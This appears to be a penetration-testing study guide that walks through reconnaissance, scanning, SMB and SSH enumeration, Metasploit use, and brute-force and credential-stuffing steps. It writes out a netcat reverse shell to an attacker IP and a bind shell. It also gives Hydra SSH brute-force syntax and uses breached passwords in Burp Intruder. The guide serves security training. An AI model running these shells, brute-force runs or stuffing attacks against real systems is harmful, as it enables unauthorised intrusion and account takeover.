The content will be divided into the different sections that make up a penetration test, which are:
1. Reconnaissance/Information Gathering
2. Scanning & Enumeration
3. Exploitation
4. Maintaining Access
5. Covering Tracks (cleaning up). 

All the tools can be used to assist in a penetration test, although one does not need to use them all in all cases. 

--------------------------------------------------------------------------------------------------------------------------------------------------------------

1. Reconnaissance 

Reconnaissance is actually made up of two different parts, Active and Passive Reconnaissance. Passive essentially means any information gathering that does not hit the servers of the company.
We might be looking for physical things like the office layout, the security around the office, what the office access card looks like, who the employees are, what they do, email addresses etc.
All this information can be found without actually hitting the servers. In this phase it would also be useful to find any sub domains etc. 

Active information gathering is when we actually hit the servers, and sort of moves into the second phase of the penetration test, which is scanning. 

For finding email addresses:
<a href="https://hunter.io/">Hunter.io</a>
<a href="https://phonebook.cz/">Phonebook</a>
Clearbit - a Google Chrome plugin - works in Gmail
<a href="https://tools.emailhippo.com/">Verify if an email is active</a>
<a href="https://email-checker.net/validate">Verify if an email is active</a>

We need to find breached date and we can use different tools to find email addresses and passwords used by employees of a company online on other services. If we can find users that have used the same/similar passwords on different external systems, then we can use those on the company systems (with modifications). 

https://github.com/hmaverickadams/breach-parse - this can be used to find breached user/password combinations found on the darknet. Note that the file is really big. 
https://www.dehashed.com/ - a great tool to search for usernames, passwords, linked email accounts etc. This is a really powerful tool and can help us to find passwords that we can use and to link account and users to other accounts.
https://hashes.com/en/decrypt/hash - use it to crack hashes that you find on dehashed.com
https://github.com/Rog3rSm1th/Profil3r - a potential tool to use that could be used instead of dehashed

Web information Gathering:

sublister - can be installed on kali using "apt install sublist3r"
syntax is: sublist3r -d domain
https://crt.sh/ - another tool available on the interweb for finding sub domains.
https://github.com/OWASP/Amass - extremely powerful tool, used by bountyhunters. Install on Kali using snap. Install snapd first and then install Amass using snap. 
https://github.com/tomnomnom/httprobe - once we have a list of sub domains, we need to check which ones are actually live and active. We can use this tool to test that.

Determine what the sites are built with:
https://builtwith.com/ - This site can be used to tell you what tools, widgits, tech, languages and CMS has been used to build the site.
Wappalyzer is a browser plugin that can be used as well. We need information regarding tech being used, any type of information could be useful later.
whatweb - tool built into Kali. syntax: "whatweb https://domain
Burp Suite - built into Kali.

Google Fu 

https://ahrefs.com/blog/google-advanced-search-operators/ - very useful document to go back to when needed.
some syntax:
site:domain
site:domain -www (will not bring in www.domain
site:domain filetype:docx (pdf, csv, etc)

Social Media
LinkedIn - Can be used to find all sort of info from pictures for physical security tests and SE. LinkedIn will also provide lists of people working at the company. This can be used to link back to Hunter.io to create new usernames that you can add to the list.
Twitter - Can also be used to gather physical security information

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

2. Scanning and Enumeration

nmap - need one say more? :)
syntax for TCP scan - nmap -T4 -p- -A IP (-T4 is speed, for lower risk of detection go for 1, for quick when not worried about detection, go for 4, -p- is to say scan all ports, -A says we want all the information, like OS info, versions of services etc)
syntax for UDP scan - nmap -T4 -sU -p IP (-T4 for speed, -sU to say UDP scan, -p to only scan the top 1000 ports since UDP is connectionless and will take a long time if scanning all 65000 ports.)
nikto - useful web vulberability scanner. Worth noting that if there is a WAF, it might block nikto scans, so when doing this in the real world, use best judgement
syntax: nikto -h http://hostnameorip
syntax: nikto -h https://hostnameorip

Directory busting tools
dirbuster - can be used to bust the directories found by Nikto
syntax: dirbuster& - loads the program. Put in the host and port, make sure to include http or https and the port, eg: http://10.0.2.10:80/ then select go faster and find the wordlist under /usr/share/wordlist/dirbuster/ (start with the small list). File extension is important to know. If the server is running Apache, it will be using php. If it was a Microsoft server, then most likely file extensions would be asp or aspx.
dirb - similar to dirbuster
gobuster - similar to dirbuster

SMB: 

Really important to find out the version inforomation for SMB to determine if there are vulnerabilities. The nmap scan run earlier will provide some information, but generally we have to do some more digging to find the actual version running. 
Run Metasploit to find the version of SMB
syntax: msfconsole
:> search smb
look for auxillory and if you scroll down in the list you will find one that checks SMB version under scanners.
syntax: use auxiliary/scanner/smb/smb_version
syntax: info (shows the info and options available within the module)
alternative syntax: options (just shows the options available)
syntax: SET RHOSTS IP (note, if it says RHOSTS (plural), then one can enter an IP range using IP/24 or whatever the network range is)
syntax: run

SMBclient - allows us to connect to the share (if annonymous connections are allowed) so we can see what is on the share.
syntax: smbclient -L \\\\IP\\ (-L means list, and we are character escaping using the backslashes) 
if we find a share, then we can try to connect another way
syntax: smbclient \\\\IP\\sharename
We need to gather the info we can at this stage.

SSH:

Sometimes nmap scan will give us the version of SSH, but if not, we can connect to SSH and hopefully get a version number. Note, that this would be considered exploitation, since we are making a connection.
if we connect to ssh and it give us an error about the algorithm, if it is old, then we can run the following:
syntax: ssh IP -oKexAlgorithms=+keymethodlistedinerror
if we then get a cipher error, we can add cipher to the connection info:
syntax: ssh IP -oKexAlgorithms=+keymethodlistedinerror -c aes128-cbc (for example)
Note: Sometimes a banner is exposed which says the version of SSH

Researching the vulnerabilities found:

Set the vulnerabilities from low hanging fruit to more difficult. Port 80/443 and SMB are probably low hanging fruit, where SSH for example would be not very likely to have a vulnerabilitiy. 

First way is to use google and google each version + exploit

Look for Exploit-DB entries and others like Rapid7. 

If one does not have internet access, one can search for the vulnerabilities locally on the kali box. 

syntax: searchsploit system version (do not be too specific, so for example samba 2 not samba 2.2.1a)

Scanning: 

Nessus:

Install Nessus and then run a basic scan. You can also look at the Advanced scan and run that instead. Once the scan is finished, remove the groupings and then look at the ones with highest severity first.

--------------------------------------------------------------------------------------------------------------------------------------------------------

3. Exploitation

Important to understand the difference between a reverse shell and a bind shell. Also worth noting that a reverse shell is most commonly used, but we need to know about bind shells as well.

A reverse shell is when you have the victim machine sending out a connection on a specific port with a shell available. The attack machine would then be listening on that specific port. 
Example: 
On attack machine: 
nc -nvlp 4444
On victim machine:
nc attackIP 4444 -e /bin/bash

A bind shell is when the victim machine is listening on a specific port, but still offering the shell.
Example: 
victim:
nc -nvlp 4444 -e /bin/bash
Attack:
nc victimIP 4444

Payloads:

Staged versus Non-Staged
Non-staged payloads means sending the entire payload in one go. The problem is that these are often large in size and it will often not work.
Staged means that the payloads are sent in stages, but this can be less stable. 
Identify non-staged versus staged in Metasploit:
non-staged example: windows/meterpreter_reverse_tcp
staged example: windows/meterpreter/reverse_tcp 
Note, the above syntax is how to know if a payload is staged or non-staged, so it carries through through out Metasploit. 

Metasploit:

syntax: msfconsole
syntax: search vulnerability (for example samba 2.2)
based on our info gathering, we should know the underlying OS, so we can select the correct exploit
syntax: use exploit
syntax: options
syntax: set RHOSTS
syntax: options
syntax: run or exploit
if the session keeps getting killed, then hit:
syntx: options
now, Metasploit should tell you which payload it is using, this is where staged versus non-staged comes into play.
syntax: set linux/x86/tab/tab and it should show you the payload options
find an option that is not the type that you have already tried.
syntax: set payload
syntax: options
syntax: set LHOST and RHOST (if needed)
syntax: exploit
Keep trying until you find an exploit that works for you.

Manual Exploitation: 

For example:
git clone a repo
follow the steps to install required packages
use gcc to make it executable
run the file to see options
run with the options

Brute Force Attacks:

Sometimes we want to actually be loud during a penetration test so that the company can say: "hey, we see you", which means you can give cudoos to them in the report and say "you saw me here and here, but not here."

Brute force SSH:
Hydra is a great tool to bruteforce SSH. 
syntax: hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://IP:PORT -t 4 -V (for example, where -l is the username (-L could be used for a list), -P for password list, ssh to say what we are attacking and -t for the number of threads and -V for verbosity)
Alternative:
Metasploit
syntax: msfconsole
syntax: search ssh
we are looking for an auxiliary module
syntax: use auxiliary/scanner/ssh/ssh_login
syntax: options
syntax: set username root
syntax: set pass file /usr/share/wordlists/metasploit/unix_passwords.txt
syntax: set RHOSTS IP
syntax: options
syntax: run

Credential Spraying and Password Stuffing:

We need to use the usernames and passwords we found during info gathering and we are going to hit the website login with those. This has turned out to be one of the most common ways to get access to external systems in pen tests. 

Google Foxy Proxy and install the plugin in Firefox. 
Once installed, click on options and add Burpsuite as a proxy. Add the local IP (127.0.0.1) and port 8080. 
Once saved, hit Foxy Proxy and turn on Burpsuite
Then, load Burp Suite
Turn off the intercepter in Burp Suite and browse to Tesla.com (note, this is just an example, do not hit tesla.com)
then click on sign in 
Turn the intercept back on
enter a username and password (any random) and hit login. Burp Suite should intercept the request.
Send the intercept to Intruder in Burp Suite
Select the Positions tab in Intruder
Hit Clear
Select the email and click on add
Select the password and click add
Select Attack Type Pitchfork
Click on Payloads
Select the list of users found and copy and then paste it. 
Then, on the second one, select all the passwords, copy and paste it. 
This will then take each username and link it to the password associated with it. 
Click attack. 
You are looking for maybe a 301 redirect or a significant change in the length. Also, pause, click on the response and look for something like: "We could not log you in". This could be added under Options Grep Match (remove the other ones listed there). Run the attack again and it will now clearly show with a checkbox the logins that get that response. 

For password spraying, we would need to remove the password option from the above and only have the username list added and switch the Attack Type to sniper. Then, you would add a specific password. NOTE! Since you are most likely doing this against AD, make sure to ask before you attempt this and say: "Hey, how many attempts have you set before you lock the accounts?"
